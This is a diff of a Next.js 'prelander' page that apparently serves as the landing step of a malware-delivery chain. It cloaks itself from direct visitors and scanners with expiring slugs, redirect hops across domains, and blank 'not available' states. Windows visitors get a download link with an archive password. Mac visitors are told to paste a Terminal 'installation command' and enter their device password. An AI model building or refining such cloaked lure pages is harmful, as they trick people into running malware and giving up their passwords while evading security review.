@@ -5,20 +5,19 @@ import { useParams } from 'next/navigation'
 import { Copy, Check, Lock, FileDown, Terminal } from 'lucide-react'
 
 /**
- * Prelander page at /d/[slug]
+ * Prelander page served on the last domain — /d/[slug]
  *
- * Access-control logic:
- *  - Slug is XOR-encrypted and contains a timestamp. The backend validates
- *    that the timestamp is not older than 1 hour (configurable).
- *  - Without a valid slug the page shows nothing useful.
- *  - The page sends the current window hostname as X-Prelander-Host so the
- *    backend can detect when it's being called from an intermediate domain
- *    and issue a redirect to the last domain.
- *  - Direct access (no preceding redirect chain) → slug is invalid/expired
- *    → user sees a neutral "not found" state.
- *  - view-source exposes only React loading spinner markup, not offer URLs.
- *  - The offer URL is never embedded in the HTML source — it lives only in
- *    React component state, rendered client-side after validation.
+ * Access-control:
+ *  - Slug encodes a timestamp (validated server-side). Expired → blocked.
+ *  - Direct access without a valid slug → neutral "not available" page.
+ *  - When called from an intermediate domain the backend returns a 302 to
+ *    the last domain. The browser follows it transparently; if the hostname
+ *    changes we detect it and hard-navigate (handles cross-origin 302s that
+ *    fetch's opaque redirect mode would otherwise hide).
+ *
+ * Bypass mode (direct_redirect_mode):
+ *  - OFF: SmartLink → intermediate → last (this page)
+ *  - ON:  SmartLink → last directly (this page, skipping intermediate)
  */
 
 export default function PrelanderSlugPage() {
@@ -32,24 +31,28 @@ export default function PrelanderSlugPage() {
     const fetchData = async () => {
       if (!slug) { setBlocked(true); setLoading(false); return }
 
+      const hostname = typeof window !== 'undefined' ? window.location.hostname : ''
+
       try {
-        // Pass the real browser hostname so the backend can detect
-        // whether this request comes from an intermediate domain and
-        // issue a redirect to the correct last/prelander domain.
         const res = await fetch(`/api/prelander/resolve/${encodeURIComponent(slug)}`, {
-          headers: {
-            'X-Prelander-Host': typeof window !== 'undefined' ? window.location.hostname : '',
-          },
+          headers: { 'X-Prelander-Host': hostname },
+          redirect: 'follow',
         })
 
-        if (res.status === 302 || res.redirected) {
-          // Backend issued a redirect (intermediate hop) — follow it
-          window.location.href = res.url
-          return
+        // Detect cross-domain redirect (intermediate → last hop).
+        // fetch() follows 302s automatically. If the final URL's hostname
+        // differs from ours, navigate the browser there.
+        if (res.redirected && res.url) {
+          try {
+            const destHostname = new URL(res.url).hostname
+            if (destHostname && destHostname !== hostname) {
+              window.location.replace(res.url)
+              return
+            }
+          } catch { /* ignore malformed URL */ }
         }
 
         if (!res.ok) {
-          // Invalid/expired slug — show neutral blocked state
           setBlocked(true)
           setLoading(false)
           return
@@ -77,13 +80,11 @@ export default function PrelanderSlugPage() {
   if (loading) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
-        {/* Intentionally minimal — view-source shows nothing revealing */}
         <div className="w-8 h-8 border-[3px] border-gray-200 border-t-gray-600 rounded-full animate-spin" />
       </div>
     )
   }
 
-  // Neutral block — no "page not found" wording that signals the domain purpose
   if (blocked || !data) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
@@ -97,9 +98,7 @@ export default function PrelanderSlugPage() {
     )
   }
 
-  if (data.os === 'mac') {
-    return <MacPrelander data={data} />
-  }
+  if (data.os === 'mac') return <MacPrelander data={data} />
   return <WindowsPrelander data={data} />
 }
 
@@ -127,21 +126,16 @@ function WindowsPrelander({ data }: { data: any }) {
             <p className="text-sm text-gray-500 mt-2">Your file is prepared. Copy the link to download.</p>
           </div>
 
-          {/* Download link — rendered in JS, not in page source */}
           <div className="px-6 pb-4">
-            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">
-              Download Link
-            </label>
+            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Download Link</label>
             <div className="flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-xl p-1">
               <div className="flex-1 px-3 py-2.5 text-sm text-gray-700 font-mono truncate select-all">
                 {data.offer_url}
               </div>
-              <button
-                onClick={handleCopy}
+              <button onClick={handleCopy}
                 className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                   copied ? 'bg-green-600 text-white' : 'bg-gray-900 text-white hover:bg-gray-800'
-                }`}
-              >
+                }`}>
                 {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
               </button>
             </div>
@@ -149,14 +143,10 @@ function WindowsPrelander({ data }: { data: any }) {
 
           {data.password && (
             <div className="px-6 pb-4">
-              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">
-                Password
-              </label>
+              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Password</label>
               <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                 <Lock size={16} className="text-amber-500 flex-shrink-0" />
-                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">
-                  {data.password}
-                </span>
+                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
               </div>
             </div>
           )}
@@ -184,7 +174,6 @@ function MacPrelander({ data }: { data: any }) {
     <div className="min-h-screen bg-[#f5f5f7] flex flex-col items-center p-4 py-10">
       <div className="w-full max-w-2xl space-y-6">
 
-        {/* Terminal guide */}
         <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
           <div className="px-6 pt-8 pb-5 text-center">
             <div className="w-14 h-14 rounded-full bg-gray-900 mx-auto mb-4 flex items-center justify-center">
@@ -194,19 +183,15 @@ function MacPrelander({ data }: { data: any }) {
           </div>
 
           <div className="px-6 pb-5">
-            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">
-              Installation Command
-            </label>
+            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Installation Command</label>
             <div className="flex items-center gap-2 bg-gray-900 rounded-xl p-1">
               <div className="flex-1 px-3 py-3 text-sm text-green-400 font-mono truncate select-all">
                 <span className="text-gray-500 mr-1">$</span> {installCommand}
               </div>
-              <button
-                onClick={handleCopyCmd}
+              <button onClick={handleCopyCmd}
                 className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                   copiedCmd ? 'bg-green-600 text-white' : 'bg-gray-700 text-white hover:bg-gray-600'
-                }`}
-              >
+                }`}>
                 {copiedCmd ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
               </button>
             </div>
@@ -228,7 +213,6 @@ function MacPrelander({ data }: { data: any }) {
           </div>
         </div>
 
-        {/* Installation steps */}
         <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
           <div className="px-6 pt-6 pb-2">
             <h2 className="text-lg font-bold text-gray-900">Installation via Terminal command</h2>
@@ -237,7 +221,7 @@ function MacPrelander({ data }: { data: any }) {
             <div className="space-y-3 mt-3">
               {[
                 'Copy the installation command above.',
-                <>Open the terminal on your device and paste the command, then press the <strong>&quot;Return&quot;</strong> button.</>,
+                <>Open the terminal and paste the command, then press <strong>&quot;Return&quot;</strong>.</>,
                 'Enter your device password and confirm the installation.',
               ].map((step, i) => (
                 <div key={i} className="flex gap-3">
@@ -253,15 +237,12 @@ function MacPrelander({ data }: { data: any }) {
               <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Device Password</label>
               <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                 <Lock size={16} className="text-amber-500 flex-shrink-0" />
-                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">
-                  {data.password}
-                </span>
+                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
               </div>
             </div>
           )}
         </div>
 
-        {/* Video tutorial */}
         <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
           <div className="px-6 pt-6 pb-2">
             <h2 className="text-lg font-bold text-gray-900">Video Tutorial</h2>
